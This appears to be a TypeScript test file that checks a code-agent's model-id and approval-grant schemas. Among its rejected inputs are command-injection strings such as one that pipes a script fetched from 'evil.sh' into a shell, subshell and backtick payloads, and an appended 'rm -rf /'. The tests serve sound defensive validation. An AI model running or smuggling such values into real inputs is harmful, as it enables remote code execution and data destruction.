import { describe, expect, it } from "vitest";
import {
	codeAgentModelSchema,
	codeAgentStreamForwardedPropsSchema,
} from "#/shared/domain/code-agent/schemas";

describe("codeAgentModelSchema", () => {
	it.each([
		"gpt-5",
		"claude-opus-4-1",
		"Qwen/Qwen2.5-Coder-3B-Instruct-GGUF:Q4_K_M",
		"meta-llama/Llama-3.3-70B-Instruct",
		"openai/gpt-oss-120b",
	])("accepts the model id %s", (model) => {
		expect(codeAgentModelSchema.safeParse(model).success).toBe(true);
	});

	it.each([
		["a command separator", "gpt-5; curl evil.sh | sh"],
		["a subshell", "gpt-5$(id)"],
		["a backtick", "gpt-5`id`"],
		["a newline", "gpt-5\nrm -rf /"],
		["a space", "gpt 5"],
		["a quote", 'gpt-5"'],
		["nothing at all", ""],
	])("rejects a model id carrying %s", (_reason, model) => {
		expect(codeAgentModelSchema.safeParse(model).success).toBe(false);
	});
});

describe("codeAgentStreamForwardedPropsSchema", () => {
	it("defaults to no grants, so a plain run widens nothing", () => {
		const parsed = codeAgentStreamForwardedPropsSchema.parse({});

		expect(parsed.approvedApprovalIds).toEqual([]);
	});

	it("accepts the ids the sandbox mints", () => {
		const parsed = codeAgentStreamForwardedPropsSchema.parse({
			approvedApprovalIds: ["claude-code:command:npm test"],
		});

		expect(parsed.approvedApprovalIds).toEqual(["claude-code:command:npm test"]);
	});

	it("caps how many grants one run can carry", () => {
		const tooMany = Array.from({ length: 51 }, (_, i) => `claude-code:command:cmd${i}`);

		expect(
			codeAgentStreamForwardedPropsSchema.safeParse({ approvedApprovalIds: tooMany }).success,
		).toBe(false);
	});

	it("rejects an empty id", () => {
		expect(
			codeAgentStreamForwardedPropsSchema.safeParse({ approvedApprovalIds: [""] }).success,
		).toBe(false);
	});
});
